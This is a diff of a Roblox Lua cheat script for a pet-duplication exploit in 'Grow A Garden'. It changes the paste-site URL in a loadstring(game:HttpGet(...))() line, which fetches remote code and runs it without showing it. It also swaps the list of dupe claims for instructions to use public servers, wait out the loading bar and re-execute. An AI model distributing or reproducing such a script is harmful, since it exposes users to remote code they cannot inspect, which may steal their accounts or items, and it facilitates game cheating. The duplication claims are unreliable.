@@ -1,5 +1,4 @@
--- Then run the external script
-loadstring(game:HttpGet("https://pastefy.app/pxrvo0PV/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/rrv6XreF/raw"))()
 
 -- After a short delay, show the Pet List GUI
 task.delay(2, function()
@@ -31,7 +30,7 @@ task.delay(2, function()
     local title = Instance.new("TextLabel", frame)
     title.Size = UDim2.new(1, -40, 0, 30)
     title.Position = UDim2.new(0, 10, 0, 5)
-    title.Text = "Supported Pets"
+    title.Text = "Script Guide Lines"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.BackgroundTransparency = 1
     title.TextXAlignment = Enum.TextXAlignment.Left
@@ -51,17 +50,16 @@ task.delay(2, function()
     uiList.Padding = UDim.new(0, 4)
 
     local pets = {
-        "Grow A Garden Supported Pets To Dupe",
-        "Dragonfly🐉 / Raccoon🦝 / Red Fox🦊 |Just Rejoin And Execute To Dupe Again!|",
+        "IMPORTANT !!",
+        " Firstly, Make Sure You Are Not In Private Server. Cuz The Script Doesn't Work In Private Server ❗❗❗ ",
         " ",
-        "Original Pets |  =  |   How Many You Can Dupe",
-        "–––––––––––––––––––––––––––––––––––––––––––––––––",
-        "1🐉🦝🦊 = 2 to dupe Dragonfly🐉 / Raccoon🦝 / Red Fox🦊",
-        "2🐉🦝🦊 = 4 to dupe Dragonfly🐉 / Raccoon🦝 / Red Fox🦊",
-        "3🐉🦝🦊 = 6 to dupe Dragonfly🐉 / Raccoon🦝 / Red Fox🦊",
-        "4🐉🦝🦊 = 8 to dupe Dragonfly🐉 / Raccoon🦝 / Red Fox🦊",
-        "5🐉🦝🦊 = 10 to dupe Dragonfly🐉 / Raccoon🦝 / Red Fox🦊",
-        "MORE🐉🦝🦊 = MORE TO DUPE🐉🦊🦊♾️"
+        " Stucking Errors ",
+        " After Excute The Script You Must Wait Until The Loading Bar Is Fulled ",
+        " Sometimes The Loading Bar Usually Stuck In 100% Cuz Of Network Error. ",
+        " ",
+        " If it's Like That Wait 5 More Minutes. ",
+        " ",
+        " After 5 Minutes Wating And The Loading Sitll Stuck, Rejoin The Game And Re excute The Script Again And Wait Again ♻ ",
     }
 
     for _, pet in ipairs(pets) do
